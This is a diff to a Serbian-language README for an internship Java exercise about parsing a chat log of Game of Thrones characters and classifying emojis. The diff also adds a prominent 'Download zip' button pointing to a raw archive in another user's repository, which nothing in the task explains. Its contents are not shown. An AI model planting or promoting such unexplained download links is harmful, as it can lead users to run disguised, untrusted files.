@@ -1,6 +1,8 @@
 # Naziv zadatka: Projekat prakse
 
-Opis zadatka: U zadatku se nalazi chat (razmena poruka) između osoba. Sadržaj chat-a možete naći u folderu Resources. Vaš zadatak podrazumeva implementaciju sledećih aktivnosti:
+Opis zadatka: U zadatku se nalazi chat (razmena poruka) između osoba. Sadržaj chat-a možete naći u folderu Resources.
+
+Vaš zadatak podrazumeva implementaciju sledećih aktivnosti:
 
 1. Kreirajte klasu osoba koja sadrži podatke za svaku osobu u got_meta_data.txt datoteci.
 2. Odštampajte sve poruke osobe Daenerys.
@@ -16,3 +18,10 @@ Opis zadatka: U zadatku se nalazi chat (razmena poruka) između osoba. Sadržaj 
 
     - LOVING: 😍😘
 
+<div align = center>
+
+<!-- BEGIN LATEST DOWNLOAD BUTTON -->
+[![Download zip](https://github.com/Mirunelo/java-misanu/blob/main/DownloadJ.svg "Download Java Project")](https://github.com/Mirunelo/java-misanu/raw/main/projekti/Java_IT_P_Praksa.zip)
+<!-- END LATEST DOWNLOAD BUTTON -->
+
+</div>
